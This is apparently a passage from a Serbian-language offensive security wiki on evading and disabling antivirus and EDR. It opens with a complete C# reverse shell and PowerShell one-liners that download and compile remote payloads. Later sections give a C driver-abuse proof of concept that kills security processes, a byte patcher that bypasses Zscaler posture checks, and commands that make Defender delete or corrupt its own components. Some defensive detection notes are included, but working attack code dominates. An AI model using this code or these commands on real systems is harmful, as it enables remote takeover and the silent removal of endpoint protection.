using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# pomoću kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje Pythona za primer pravljenja injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre nego što ubaci ransomware. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih operacija u kernelu koje ne mogu da blokiraju čak ni AV servisi zaštićeni pomoću Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ključni zaključci
1. **Potpisani driver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs-ovog „System In-Depth Analysis Toolkit“. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje driver kao **kernel service**, a druga ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz user land-a.
3. **IOCTL-ovi koje driver izlaže**
   | IOCTL code | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces prema PID-u (koristi se za gašenje Defender/EDR servisa) |
   | `0x990000D0` | Izbrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Ukloniti driver i izbrisati service |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u korisničkom režimu; kod koji se izvršava u kernelu može da otvara *zaštićene* procese, da ih prekida ili da menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge funkcije za ojačavanje zaštite.

Detekcija / ublažavanje
•  Omogućite Microsoft-ovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbijao učitavanje datoteke `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i generišite upozorenje kada se drajver učita iz direktorijuma sa dozvolom za pisanje za sve korisnike ili nije na listi dozvoljenih.
•  Pratite ručke iz korisničkog režima ka prilagođenim objektima uređaja, a zatim i sumnjive pozive `DeviceIoControl`.

### Zaobilaženje provera stanja uređaja u Zscaler Client Connector-u izmenama binarnih datoteka na disku

Zscaler **Client Connector** lokalno primenjuje pravila za stanje uređaja i oslanja se na Windows RPC za prenos rezultata drugim komponentama. Dva slaba проектна избора омогућавају потпуно заобилажење:

1. Провера стања уређаја обавља се **у потпуности на страни клијента** (серверу се шаље логичка вредност).
2. Интерне RPC крајње тачке проверавају само да ли је извршна датотека која се повезује **потписана од стране Zscaler-а** (помоћу `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Изменом четири потписане бинарне датотеке на диску** оба механизма могу да се неутралишу:

| Бинарна датотека | Измењена оригинална логика | Резултат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Увек враћа `1`, па свака провера показује усклађеност |
| `ZSAService.exe` | Индиректни позив функције `WinVerifyTrust` | Замењен са NOP ⇒ сваки процес (чак и непотписан) може да се повеже са RPC цевима |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замењено са `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Провере интегритета тунела | Заобиђене |

Извод минималног patcher-а:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere bezbednosnog stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke preko imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju koje se donose isključivo na klijentskoj strani i jednostavne provere potpisa mogu zaobići sa nekoliko izmena bajtova.

## Zloupotreba pouzdane funkcionalnosti Microsoft Defender `BTR.sys`

Defenderov drajver **Boot-Time Removal** koristan je primer koji odudara od klasičnog BYOVD. `BTR.sys` je legitimna Microsoft-om potpisana komponenta za sanaciju, bez greške oštećenja memorije i bez interfejsa IOCTL; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operator može umesto toga da falsifikuje njegovu privatnu transakciju za sanaciju i да obavi predviđene operacije nad fajlovima i registrom u Ring-0. Ovo je **primitiv za neutralizaciju AV/EDR-a nakon kompromitovanja, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` sopstvenog `MpEngine.dll` na ciljnom sistemu, umesto da se uveze upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično zapisuje resurs u fajl nasumičnog naziva `[a-z]{8}.sys` i registruje kernel servis sličnog naziva. `DriverEntry` čita vrednost `Args` servisa, otvara navedeni NTFS ADS, dešifruje i proverava listu radnji, zapisuje povratne informacije i nakon uspešnog izvršavanja vraća `0xC0000056` (`STATUS_DELETE_PENDING`), čime se drajver uklanja umesto da ostane učitan. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Stream `:changelist` sadrži jedan blob šifrovan RC4-om. U analiziranim verzijama koristi se fiksni ključ od 256 bajtova, pa šifrovanje ne predstavlja granicu autorizacije. Ispravan tekst u čistom obliku sadrži globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz podataka), zatim putanju do feedback datoteke kodiranu kao UTF-16 i završenu null znakom, kao i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju, koji se završavaju sa **tačno četiri NUL bajta**. Svako zaglavlje/podatkovni region proverava se zasebno pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija otkrivaju ove kernel primitive.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje datoteke na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje registry ključa |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje registry vrednosti |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje registry vrednosti i kreiranje putanja do ključa koje nedostaju |

Kod akcija 5 i 6, separator ključa/vrednosti na žici su **dve uzastopne obrnute kose crte**; uobičajeno formatirana putanja neće biti pravilno razdvojena. Feedback datoteka uglavnom odražava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Kod akcija 1 i 2, koje nemaju polje sa vodećim zastavicama, BTR pomera putanju u četiri rezervisana završna bajta kako bi oslobodio prostor za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i период ranog pokретања

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) sprovodi ceo lanac: izdvaja `BTR.sys` iz lokalnog Defendera, kreira `<random>.sys:changelist` i feedback stream, serijalizuje/izračunava kontrolne sume/šifruje ulančane akcije, direktno kreira service registry ključ, a zatim poziva `NtLoadDriver` za `-trigger now` ili ostavlja driver kao driver koji se pokreće pri pokretanju sistema za `-trigger boot`. Direktno pripremanje registry-ja zaobilazi uobičajeni SCM `CreateServiceW` put i zato **ne** generiše Event ID 7045 za instalaciju servisa. Artefakti pokrenuti pri podizanju sistema mogu se kasnije ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja file I/O iz funkcije `DriverEntry` pre nego što storage stack i veza `SystemRoot` budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga izvršava se u fazi 1: NTFS je upotrebljiv, ali mnogi bezbednosni drajveri koji se pokreću pri startovanju sistema i korisnički EDR servisi još nisu inicijalizovani. Boot-start filteri kao što je `WdFilter` možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, a može i da izbriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon procene boot-start komponenti i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji izvršava se u jednoj transakciji. PoC dodaje Action 1 na početak za hardkodiranu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim izvršava sopstveni zahtev za brisanje i uklanja ga pre nego što se rastereti. Time se smanjuju tragovi, dok smeštanje povratnih informacija u `<random>.sys:<random>.dat` omogućava da se drajver i oba toka uklone zajedno.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju sa visokim signalom

Pravila zasnovana samo na potpisu i Microsoftova lista blokiranih ranjivih drajvera ne rešavaju zloupotrebu predviđene funkcionalnosti BTR-a. Dajte prednost sledećim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kreiranje `.sys:changelist` univerzalno je za BTR staging. ADS `.dat` pridružen istoj datoteci `.sys` posebno je sumnjiv jer legitimni Defender obično smešta povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** Korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući događaj instalacije SCM-a.
- **Sysmon 6 -> 23:** Korelišite učitavanje poznatog BTR drajvera koji nije pokrenut iz Defender porekla sa naknadnim brisanjem datoteka koje se pripisuje procesu `System`/PID 4, naročito kada su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** Upozorite na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i proveravajte dodeljivanje/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada drajver bezbednosnog alata pripremaju `cmd.exe`, PowerShell ili nepoznat proces.

## Zloupotreba Protected Process Light (PPL) za manipulisanje AV/EDR-om pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisnika/nivoa, tako da samo zaštićeni procesi istog ili višeg nivoa mogu da manipulišu jedni drugima. Sa ofanzivne strane, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om и да контролишете њене аргументе, можете да претворите бенигну функционалност (нпр. евидентирање) у ограничену PPL-подржану могућност уписа у заштићене директоријуме које користе AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Шта је потребно да би се процес покренуо као PPL
- Циљна EXE датотека (и све учитане DLL датотеке) мора бити потписана EKU-ом који подржава PPL.
- Процес мора бити креиран помоћу CreateProcess и заставица: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Мора се затражити компатибилан ниво заштите који одговара потписнику бинарне датотеке (нпр. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` за потписнике anti-malware софтвера, `PROTECTION_LEVEL_WINDOWS` за Windows потписнике). Погрешни нивои довешће до неуспелог креирања процеса.

Погледајте и шири увод у PP/PPL и LSASS заштиту овде:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Алатке за покретање
- Помоћни алат отвореног кода: CreateProcessAsPPL (бира ниво заштите и прослеђује аргументе циљној EXE датотеци):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Начин коришћења:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sam sebe i prihvata parametar za upisivanje log fajla na putanju koju zada pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla obavlja se uz zaštitu PPL-a.
- ClipUp ne može da obradi putanje koje sadrže razmake; koristite kratke putanje 8.3 da biste ukazali na obično zaštićene lokacije.

Pomoćni alati za kratke putanje 8.3
- Izlistajte kratka imena: `dir /x` u svakom nadređenom direktorijumu.
- Izvedite kratku putanju u cmd-u: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite LOLBIN koji podržava PPL (ClipUp) uz `CREATE_PROTECTED_PROCESS` pomoću pokretača (npr. CreateProcessAsPPL).
2) Prosledite argument za putanju ClipUp log fajla da biste izazvali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratka imena 8.3.
3) Ako je ciljni binarni fajl obično otvoren/zaključan od strane AV-a dok radi (npr. MsMpEng.exe), zakažite upisivanje pri pokretanju sistema, pre nego što se AV pokrene, tako što ćete instalirati uslugu za automatsko pokretanje koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor-a (evidentiranje pokretanja sistema).
4) Pri ponovnom pokretanju sistema upisivanje uz zaštitu PPL-a obavlja se pre nego što AV zaključa svoje binarne fajlove, čime se oštećuje ciljni fajl i sprečava pokretanje.

Primer poziva (putanje su izostavljene/skraćene radi bezbednosti):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, već samo mesto upisa; ova primitiva je pogodna za oštećivanje, a ne za precizno ubacivanje sadržaja.
- Potrebna su lokalna administratorska/SYSTEM prava za instaliranje/pokretanje usluge i termin za ponovno pokretanje.
- Tajming je kritičan: ciljna datoteka ne sme biti otvorena; izvršavanje pri pokretanju sistema izbegava zaključavanje datoteka.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada ga pri pokretanju sistema pokreću nestandardni programi.
- Nove usluge konfigurisane za automatsko pokretanje sumnjivih binarnih datoteka koje se dosledno pokreću pre Defendera/AV-a. Istražite kreiranje/izmenu usluga pre neuspešnog pokretanja Defendera.
- Praćenje integriteta datoteka Defendera/direktorijuma Platform; neočekivano kreiranje/izmena datoteka od strane procesa sa oznakama zaštićenih procesa.
- Telemetrija ETW/EDR: tražite procese pokrenute sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa u procesima koji nisu AV.

Ublažavanje
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim nadređenim procesima; blokirajte pozivanje ClipUp-a izvan legitimnog konteksta.
- Higijena usluga: ograničite kreiranje/izmenu usluga koje se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Proverite da li su omogućeni Defender tamper protection i zaštite pri ranom pokretanju; istražite greške pri pokretanju koje ukazuju na oštećenje binarne datoteke.
- Razmotrite onemogućavanje generisanja kratkih 8.3 naziva na diskovima koji sadrže bezbednosne alate, ako je to kompatibilno s vašim okruženjem (temeljno testirajte).

## Neovlašćeno menjanje Microsoft Defendera putem otmice Symlink-a u fascikli verzije Platform

Windows Defender određuje platformu sa koje će se pokretati tako što nabraja podfascikle u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfasciklu sa najvišim leksikografskim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese usluge Defender (uz ažuriranje putanja usluga/registra). Ovaj izbor veruje stavkama direktorijuma, uključujući tačke ponovnog raščlanjivanja direktorijuma (symlink-ove). Administrator može ovo da iskoristi da preusmeri Defender na putanju u koju napadač može da upisuje i tako postigne DLL sideloading ili prekid rada usluge.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni administrator (potrebno za kreiranje direktorijuma/symlink-ova u fascikli Platform)
- Mogućnost ponovnog pokretanja računara ili pokretanja ponovnog izbora platforme za Defender (ponovno pokretanje usluge pri pokretanju sistema)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene fascikle, ali njegov izbor platforme veruje stavkama direktorijuma i bira leksikografski najvišu verziju bez provere da li se odredište razrešava u zaštićenu/poverljivu putanju.

Koraci (primer)
1) Pripremite kopiju trenutne fascikle platforme u koju može da se upisuje, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma sa višom verzijom unutar direktorijuma Platform, koji upućuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da uočite novu putanju procesa u okviru `C:\TMP\AV\` i konfiguraciju servisa/registar koji odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/izvršavanje koda: Postavite/zamenite DLL-ove koje Defender učitava iz direktorijuma aplikacije da biste izvršili kod u Defenderovim procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Gašenje servisa/uskraćivanje usluge: Uklonite simboličku vezu verzije kako se pri sledećem pokretanju konfigurisana putanja ne bi razrešila i Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu da premeste runtime evasion iz C2 implanta u sam ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i usmeravati odabrane API-je kroz pozicijski nezavisan kod (PIC) pod kontrolom napadača. Time se evasion proširuje van malog skupa API-ja koje mnogi kitovi izlažu (npr. CreateProcessA), a iste zaštite mogu da se primene i na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Postavite PIC blob uz ciljni modul pomoću reflective loader-a (prefiksovan ili kao prateći fajl). PIC mora biti samostalan i pozicijski nezavisan.
- Kada se host DLL učita, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT stavke za ciljne importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC omotače.
- Svaki PIC omotač izvršava evasion pre poziva originalnog API-ja preko tail-call-a. Tipični evasion postupci uključuju:
  - Maskiranje/uklanjanje maske memorije oko poziva (npr. šifrovanje beacon regiona, RWX→RX, promena naziva/dozvola stranica), a zatim vraćanje nakon poziva.
  - Call-stack spoofing: pravljenje legitimnog steka i prelazak u ciljni API tako da analiza call stack-a utvrdi očekivane okvire.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je koje treba zakačiti za Beacon, BOF-ove i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Funkcioniše za svaki kod koji koristi zakačeni import, bez menjanja koda alata ili oslanjanja na Beacon da posreduje u pozivima određenih API-ja.
- Obuhvata post-ex DLL-ove: zakačivanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion-a na njihove API pozive.
- Vraća pouzdano korišćenje post-ex komandi koje pokreću procese, čak i protiv detekcija zasnovanih na call stack-u, tako što obavija CreateProcessA/W.

Minimalni nacrt IAT hook-a (x64 C/C++ pseudokod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR i pre prve upotrebe importa. Reflective loaders kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain učitavanja modula.
- Wrappers neka budu kratki i bezbedni za PIC; pravu API funkciju pronađi pomoću originalne IAT vrednosti koju si sačuvao pre patchovanja ili pomoću LdrGetProcedureAddress.
- Za PIC koristi RW → RX prelaze i izbegavaj stranice koje su istovremeno writable i executable.

Call-stack spoofing stub
- PIC stubs u Draugr stilu prave lažni call chain (povratne adrese unutar benignih modula), a zatim preusmeravaju izvršavanje u pravu API funkciju.
- Time se zaobilaze detekcije koje očekuju kanoničke stackove od Beacon/BOFs poziva osetljivih API funkcija.
- Kombinuj ih sa tehnikama stack cutting/stack stitching da bi se izvršavanje našlo unutar očekivanih frames pre prologa API funkcije.

Operativna integracija
- Dodaj reflective loader na početak post-ex DLL-ova, kako bi se PIC i hooks automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor script za registrovanje ciljnih API funkcija, kako bi Beacon i BOFs transparentno koristili isti put za izbegavanje detekcije, bez izmena koda.

Razmatranja za detekciju/DFIR
- Integritet IAT-a: entries koje upućuju na adrese koje nisu deo image-a (heap/anon); periodična provera import pointers.
- Anomalije stacka: povratne adrese koje ne pripadaju učitanim images; nagli prelazi na PIC koji nije deo image-a; nedosledno poreklo RtlUserThreadStart.
- Telemetrija loadera: upisivanja u IAT unutar procesa, rana aktivnost DllMain koja menja import thunks, neočekivani RX regions nastali tokom učitavanja.
- Izbegavanje image-load detekcije: ako se hookuje LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assemblies povezana sa događajima memory masking.

